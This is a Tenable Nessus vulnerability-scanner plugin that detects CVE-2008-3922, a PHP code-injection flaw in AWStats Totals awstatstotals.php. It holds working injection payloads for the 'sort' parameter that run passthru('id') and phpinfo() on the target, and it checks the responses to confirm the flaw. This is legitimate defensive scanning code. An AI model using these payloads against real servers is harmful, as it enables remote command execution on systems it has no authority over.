#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(34055);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2016/11/11 20:08:42 $");

  script_cve_id("CVE-2008-3922");
  script_bugtraq_id(30856);
  script_osvdb_id(47807);
  script_xref(name:"EDB-ID", value:"17324");

  script_name(english:"AWStats Totals awstatstotals.php multisort() Function sort Parameter Arbitrary PHP Code Execution");
  script_summary(english:"run a command through awstatstotals.php?sort");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to arbitrary
code execution.");
  script_set_attribute(attribute:"description", value:
"The remote web server is running a version of awstatstotals.php which
does not properly sanitize its 'sort' argument. An attacker can run
arbitrary commands on the remote host within the context of the web
server.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/20080826165439.GQ10038@dx4.org");
  script_set_attribute(attribute:"see_also", value:"http://www.telartis.nl/xcms/awstats/" );
  script_set_attribute(attribute:"solution", value:"Upgrade to Telartis AWStats Totals 1.15");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Awstats Totals <= 1.14 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'AWStats Totals multisort Remote Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_cwe_id(94);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/08/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (get_kb_item("Settings/disable_cgi_scanning")) exit(0);

port = get_http_port(default: 80);

if (thorough_tests)
  dirs = get_kb_list(string("www/", port, "/content/directories"));
if (isnull(dirs)) dirs = make_list("", "/stat", "/awstatstotals");
dirs = list_uniq(make_list(dirs, cgi_dirs()));
report = "";

attacks = make_list(
'/awstatstotals.php?sort="].passthru(\'id\').exit().%24a["',
'/awstatstotals.php?sort={%24{passthru(chr(105).chr(100))}}{%24{exit()}}',
'/awstatstotals.php?sort="].phpinfo().exit().%24a["',
'/awstatstotals.php?sort={%24{phpinfo()}}{%24{exit()}}' );

foreach d (dirs)
{
 foreach a (attacks)
 {
  u = strcat(d, a);
  w = http_send_recv3(method:"GET",item: u, port: port);
  if (isnull(w))
   if (report)
    break;
   else
    exit(0);
  r = w[2];
  if ("phpinfo" >< a)
  {
   if (
     "<title>phpinfo()</title>" >< r && 
     "HTTP_HOST" >< r &&
     "SERVER_PORT" >< r &&
     egrep(string: r, pattern: "X-Powered-By.*PHP/[1-9]\.") &&
     egrep(pattern:"\>PHP Version (.+)\<", string:w[2])
   )
   {
    report = strcat(report, '\n', build_url(port: port, qs: u), '\nran the phpinfo() function command successfully.\n');
    break;
   }
  }
  else
  {
   if (egrep(string: r, pattern: "^uid=[0-9]+.* gid=[0-9]+"))
   {
    report = strcat(report, '\n', build_url(port: port, qs: u), '\nran the id command successfully and produced the following output:\n', chomp(r), '\n');
    break;
   }
  }
 }
 if (report && ! thorough_tests) break;
}

if (report) security_hole(port: port, extra: report);
